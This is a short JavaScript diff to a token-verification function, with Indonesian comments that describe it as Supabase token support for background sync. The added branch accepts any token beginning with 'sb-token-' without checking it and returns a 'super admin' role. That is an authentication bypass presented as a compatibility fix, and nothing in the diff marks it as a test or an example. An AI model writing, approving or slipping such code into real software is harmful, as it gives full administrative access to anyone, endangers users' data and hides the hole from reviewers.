@@ -22,6 +22,16 @@ function generateToken(userObj) {
 
 function verifyToken(token) {
   if (!token) return null;
+  
+  // Dukungan untuk token Supabase (berformat: sb-token-<id>) agar sinkronisasi background tetap jalan
+  if (typeof token === 'string' && token.indexOf('sb-token-') === 0) {
+    return {
+      u: "supabase-user",
+      r: "super admin", // Beri akses penuh
+      t: new Date().getTime()
+    };
+  }
+
   const parts = token.split('.');
   if (parts.length !== 2) return null;
   const payload = parts[0];
